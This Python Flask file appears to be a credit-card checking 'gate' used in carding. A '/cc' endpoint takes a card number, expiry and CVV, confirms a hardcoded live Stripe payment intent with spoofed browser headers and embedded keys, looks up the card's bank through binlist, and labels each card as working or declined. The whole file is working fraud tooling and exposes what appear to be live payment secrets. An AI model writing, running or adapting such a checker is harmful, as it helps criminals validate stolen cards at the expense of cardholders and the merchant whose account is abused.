import requests,flask

from flask import Flask,request

app = Flask(__name__)

@app.route("/cc")
def s():

    ccc = f"{request.get.args('c')}"
    cc = ccc.split("|")[0]
    m = ccc.split("|")[1]
    y = ccc.split("|")[2]
    cvv = ccc.split("|")[3]

    url = "https://api.stripe.com/v1/payment_intents/pi_3LE5OgHKSiz0kTyd1jM4ah5X/confirm"
    headers = {
'authority': 'api.stripe.com',
'method': 'POST',
'path': '/v1/payment_intents/pi_3LE5OgHKSiz0kTyd1jM4ah5X/confirm h2',
'scheme': 'https',
'accept': 'application/json',
'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://js.stripe.com',
'referer': 'https://js.stripe.com/',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36',
    }
    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=Trakos+Diaa&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={m}&payment_method_data[card][exp_year]={y}&payment_method_data[guid]=a95446a6-b75c-4429-bb68-7489e6957ab2f764dd&payment_method_data[muid]=cdf9bfe6-aab2-4c91-b4c7-2abf52a483ee3be400&payment_method_data[sid]=cb1d62e5-c28a-4d36-bfc0-550732abfc6bb4a5f1&payment_method_data[payment_user_agent]=stripe.js%2F988743ca6%3B+stripe-js-v3%2F988743ca6&payment_method_data[time_on_page]=104603&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret=pi_3LE5OgHKSiz0kTyd1jM4ah5X_secret_63UzakccvPfNLxgdlaQiDhBVd'
    r = requests.post(url,headers=headers,data=data)
    print(r.json())
    at = requests.get(f"https://lookup.binlist.net/{cc}").json()
    brand = at['brand']
    sc = at['scheme']
    country = at['country']['name']
    cem = at['country']['emoji']
    bank = at['bank']['name']
    if "success" in r.text or "Your card has insufficient funds." in r.text or "incorrect_zip" in r.text:
        dat = {
            "status":"success",
            "response":f"{r.json()['card']['message']}",
            "card":f"{ccc}",
            "gate":"Stripe v1",
            "country":f"{country} {cem}"
        }
        return dat
    if "Your card does not support this type of purchase." in r.text or "Your card was declined." in r.text or "Your card has expired." in r.text or "The card number is incorrect." in r.text or "do_not_honor" in r.text:
        dat = {
            "status":"error",
            "response":f"{r.json()['card']['message']}",
            "card":f"{ccc}",
            "gate":"Stripe v1",
            "country":f"{country} {cem}"
        }
        return dat
    else:
        dat = {
            "status":"error",
        }
        return dat

app.run()
